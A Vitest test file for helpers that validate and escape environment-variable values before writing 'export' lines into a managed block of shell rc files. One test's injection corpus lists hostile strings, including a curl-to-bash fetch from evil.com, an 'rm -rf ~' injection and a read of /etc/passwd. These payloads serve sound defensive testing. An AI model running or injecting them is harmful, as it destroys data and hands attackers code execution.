/**
 * Exhaustive tests for the shell-escape and validation helpers.
 *
 * These cover the OWASP shell-injection corpus plus the specific shapes
 * we've seen attackers use against `export VAR="..."` lines in shell rc
 * files. Pre-2026-06-16 the code shipped unescaped values; the test
 * suite locks in the new contract.
 */
import { describe, it, expect } from 'vitest'
import {
  validateEnvVarName,
  validateEnvVarValue,
  escapePosixShellDoubleQuoted,
  buildShellRcBlock,
  spliceShellRcBlock,
  removeShellRcBlock,
  SHELL_RC_BLOCK_START,
  SHELL_RC_BLOCK_END,
} from './env-shell-escape'

describe('validateEnvVarName', () => {
  it('accepts standard env var names we set', () => {
    for (const name of ['OPENAI_API_KEY', 'OLLAMA_HOST', 'GEMINI_API_KEY', 'OPENAI_BASE_URL', '_PRIV', 'A']) {
      expect(validateEnvVarName(name)).toBe(true)
    }
  })

  it('rejects leading digit', () => {
    expect(validateEnvVarName('1FOO')).toBe(false)
  })

  it('rejects empty string', () => {
    expect(validateEnvVarName('')).toBe(false)
  })

  it('rejects names containing whitespace, equals, quotes, dashes', () => {
    for (const bad of ['FOO BAR', 'FOO=BAR', 'FOO"BAR', "FOO'BAR", 'FOO-BAR', 'FOO\tBAR']) {
      expect(validateEnvVarName(bad)).toBe(false)
    }
  })

  it('rejects shell metacharacters in names', () => {
    for (const bad of ['FOO;rm', 'FOO|cat', 'FOO`cat`', 'FOO$X', 'FOO&&BAR', 'FOO\nBAR']) {
      expect(validateEnvVarName(bad)).toBe(false)
    }
  })

  it('rejects non-string input', () => {
    for (const bad of [null, undefined, 42, {}, []]) {
      expect(validateEnvVarName(bad)).toBe(false)
    }
  })

  it('rejects pathologically long names', () => {
    expect(validateEnvVarName('A'.repeat(257))).toBe(false)
    expect(validateEnvVarName('A'.repeat(256))).toBe(true)
  })
})

describe('validateEnvVarValue', () => {
  it('accepts standard values we set', () => {
    for (const v of [
      'sk-abc123',
      'http://127.0.0.1:11434',
      'https://api.openai.com/v1',
      'gemini-key-xyz',
      // Legit values that CONTAIN special chars but are safe once escaped:
      'token-with-$dollar',
      'token-with-`backtick',
      'token-with-"quote',
      'token-with-\\backslash',
      'token-with-;semi',
      'token-with-&amp',
      'token-with-|pipe',
    ]) {
      expect(validateEnvVarValue(v)).toBe(true)
    }
  })

  it('rejects newlines and CR (cannot be safely embedded in a shell export line)', () => {
    expect(validateEnvVarValue('foo\nbar')).toBe(false)
    expect(validateEnvVarValue('foo\rbar')).toBe(false)
    expect(validateEnvVarValue('foo\r\nbar')).toBe(false)
  })

  it('rejects NUL bytes (argv truncation surface)', () => {
    expect(validateEnvVarValue('foo\0bar')).toBe(false)
  })

  it('rejects empty values', () => {
    expect(validateEnvVarValue('')).toBe(false)
  })

  it('rejects pathologically long values', () => {
    expect(validateEnvVarValue('x'.repeat(4097))).toBe(false)
    expect(validateEnvVarValue('x'.repeat(4096))).toBe(true)
  })

  it('rejects non-string input', () => {
    for (const bad of [null, undefined, 42, {}, []]) {
      expect(validateEnvVarValue(bad)).toBe(false)
    }
  })
})

describe('escapePosixShellDoubleQuoted', () => {
  it('passes through plain printable text unchanged', () => {
    expect(escapePosixShellDoubleQuoted('hello world')).toBe('hello world')
    expect(escapePosixShellDoubleQuoted('sk-abc123')).toBe('sk-abc123')
  })

  it('escapes the 4 characters the shell interprets inside double quotes', () => {
    expect(escapePosixShellDoubleQuoted('$')).toBe('\\$')
    expect(escapePosixShellDoubleQuoted('`')).toBe('\\`')
    expect(escapePosixShellDoubleQuoted('"')).toBe('\\"')
    expect(escapePosixShellDoubleQuoted('\\')).toBe('\\\\')
  })

  it('does NOT escape characters that are literal inside double quotes', () => {
    // The shell treats these as literal text inside "..." — escaping
    // them would change semantics for legitimate API tokens.
    for (const literal of [';', '&', '|', '(', ')', "'", '*', '?', '<', '>', '[', ']', '{', '}', '!']) {
      expect(escapePosixShellDoubleQuoted(literal)).toBe(literal)
    }
  })

  it('order is correct: backslash escaped first, others after', () => {
    // If we escaped `$` first and then `\`, we'd double-escape the `\$`
    // we just produced. Test that the order is right by feeding a string
    // that contains both `\` and `$` and asserting the output is
    // round-trip-safe.
    const input = '\\$foo'
    const escaped = escapePosixShellDoubleQuoted(input)
    // After escape: the original `\` → `\\`, the original `$` → `\$`.
    expect(escaped).toBe('\\\\\\$foo')
  })

  it('survives the OWASP injection corpus (no shell expansion possible)', () => {
    const attacks = [
      '"; rm -rf ~; #',
      '$(curl evil.com | bash)',
      '`whoami`',
      '"$(echo pwned)"',
      '\\"; rm -rf /tmp/*; #',
      '"; cat /etc/passwd; "',
    ]
    for (const attack of attacks) {
      const escaped = escapePosixShellDoubleQuoted(attack)
      // After escape, none of these may contain an UNescaped `"`,
      // backtick, `$`, or unescaped backslash sequence that re-opens.
      // We assert by reconstructing the shell-quoted form and checking
      // that the `"` count is even (closing quotes only at our boundaries).
      const shellLine = `KEY="${escaped}"`
      const unescapedQuotes = shellLine.match(/(?<!\\)"/g) ?? []
      expect(unescapedQuotes.length).toBe(2) // exactly the outer pair
    }
  })

  it('throws on non-string input (defensive)', () => {
    expect(() => escapePosixShellDoubleQuoted(null as any)).toThrow()
  })

  it('round-trips through buildShellRcBlock with metachar values', () => {
    // End-to-end check: building a block with a tricky value and
    // re-parsing the `export` line yields the original value.
    const value = 'a"b`c$d\\e'
    const block = buildShellRcBlock({ FOO: value })
    const exportLine = block.split('\n').find((l) => l.startsWith('export FOO='))!
    expect(exportLine).toBe('export FOO="a\\"b\\`c\\$d\\\\e"')
  })
})

describe('buildShellRcBlock', () => {
  it('emits sentinel-fenced block with sorted keys', () => {
    const block = buildShellRcBlock({
      OPENAI_API_KEY: 'sk-foo',
      OLLAMA_HOST: 'http://127.0.0.1:11434',
    })
    expect(block.startsWith(SHELL_RC_BLOCK_START)).toBe(true)
    expect(block.endsWith(SHELL_RC_BLOCK_END)).toBe(true)
    // Sorted: O comes before O — OLLAMA before OPENAI.
    const ollamaIdx = block.indexOf('OLLAMA_HOST')
    const openaiIdx = block.indexOf('OPENAI_API_KEY')
    expect(ollamaIdx).toBeLessThan(openaiIdx)
  })

  it('is idempotent — same input yields same output', () => {
    const a = buildShellRcBlock({ FOO: 'bar', BAZ: 'qux' })
    const b = buildShellRcBlock({ FOO: 'bar', BAZ: 'qux' })
    expect(a).toBe(b)
  })

  it('refuses to emit a malformed name', () => {
    expect(() => buildShellRcBlock({ '1FOO': 'bar' })).toThrow(/env var name/)
  })

  it('refuses to emit a malformed value (newline)', () => {
    expect(() => buildShellRcBlock({ FOO: 'bar\nbaz' })).toThrow(/env var value/)
  })

  it('emits empty-block with just sentinels for empty input', () => {
    const block = buildShellRcBlock({})
    expect(block).toBe(`${SHELL_RC_BLOCK_START}\n${SHELL_RC_BLOCK_END}`)
  })
})

describe('spliceShellRcBlock', () => {
  it('inserts a fresh block when none exists', () => {
    const block = buildShellRcBlock({ FOO: 'bar' })
    const result = spliceShellRcBlock('# user content\nalias ll="ls -l"\n', block)
    expect(result).toContain('# user content')
    expect(result).toContain('alias ll="ls -l"')
    expect(result).toContain(SHELL_RC_BLOCK_START)
    expect(result).toContain('export FOO="bar"')
  })

  it('replaces an existing block atomically — no surrounding content lost', () => {
    const oldBlock = buildShellRcBlock({ FOO: 'old' })
    const newBlock = buildShellRcBlock({ FOO: 'new' })
    const file = `# user content\n${oldBlock}\n# trailing user content\n`
    const result = spliceShellRcBlock(file, newBlock)
    expect(result).toContain('# user content')
    expect(result).toContain('# trailing user content')
    expect(result).toContain('export FOO="new"')
    expect(result).not.toContain('export FOO="old"')
  })

  it('is idempotent — same input + same block twice yields same output', () => {
    const block = buildShellRcBlock({ FOO: 'bar' })
    const after1 = spliceShellRcBlock('# user\n', block)
    const after2 = spliceShellRcBlock(after1, block)
    expect(after1).toBe(after2)
  })

  it('handles empty existing content', () => {
    const block = buildShellRcBlock({ FOO: 'bar' })
    expect(spliceShellRcBlock('', block)).toBe(block + '\n')
  })

  it('inserts a blank-line separator between existing content and the appended block', () => {
    const block = buildShellRcBlock({ FOO: 'bar' })
    // Existing ends with newline → one more newline = blank line, then block.
    expect(spliceShellRcBlock('content\n', block)).toContain('content\n\n' + SHELL_RC_BLOCK_START)
    // Existing does NOT end with newline → two newlines (line-end + blank), then block.
    expect(spliceShellRcBlock('content', block)).toContain('content\n\n' + SHELL_RC_BLOCK_START)
  })

  it('only touches the first managed block when multiple are present (tamper-safe)', () => {
    const block = buildShellRcBlock({ FOO: 'new' })
    const file = `${SHELL_RC_BLOCK_START}\nexport FOO="a"\n${SHELL_RC_BLOCK_END}\n# user\n${SHELL_RC_BLOCK_START}\nexport FOO="b"\n${SHELL_RC_BLOCK_END}\n`
    const result = spliceShellRcBlock(file, block)
    expect(result).toContain('export FOO="new"')
    // Second tampered block remains (we don't try to be clever; this is
    // documented behavior).
    expect(result).toContain('export FOO="b"')
  })
})

describe('removeShellRcBlock', () => {
  it('removes a managed block and keeps surrounding user lines', () => {
    const block = buildShellRcBlock({ OPENAI_API_KEY: 'sk-byok' })
    const file = `export PATH=/usr/bin\n\n${block}\n\nalias ll='ls -la'\n`
    const result = removeShellRcBlock(file)
    expect(result).not.toContain(SHELL_RC_BLOCK_START)
    expect(result).not.toContain('sk-byok')
    expect(result).toContain('export PATH=/usr/bin')
    expect(result).toContain("alias ll='ls -la'")
    // No widening gap of blank lines left behind.
    expect(result).not.toMatch(/\n\n\n/)
  })

  it('is a no-op when no managed block exists', () => {
    const file = `export FOO=bar\nexport OPENAI_API_KEY=mine\n`
    expect(removeShellRcBlock(file)).toBe(file)
  })

  it('does not touch a user-authored OPENAI_API_KEY outside the block', () => {
    const block = buildShellRcBlock({ OPENAI_API_KEY: 'sk-managed' })
    const file = `export OPENAI_API_KEY="sk-user-own"\n${block}\n`
    const result = removeShellRcBlock(file)
    expect(result).toContain('sk-user-own')
    expect(result).not.toContain('sk-managed')
    expect(result).not.toContain(SHELL_RC_BLOCK_START)
  })

  it('is idempotent', () => {
    const block = buildShellRcBlock({ OPENAI_API_KEY: 'x' })
    const file = `a\n${block}\nb\n`
    const once = removeShellRcBlock(file)
    expect(removeShellRcBlock(once)).toBe(once)
  })

  it('removes a block sitting at the very top of the file', () => {
    const block = buildShellRcBlock({ OPENAI_API_KEY: 'x' })
    const file = `${block}\nexport KEEP=1\n`
    const result = removeShellRcBlock(file)
    expect(result.startsWith('\n')).toBe(false)
    expect(result).toContain('export KEEP=1')
  })
})
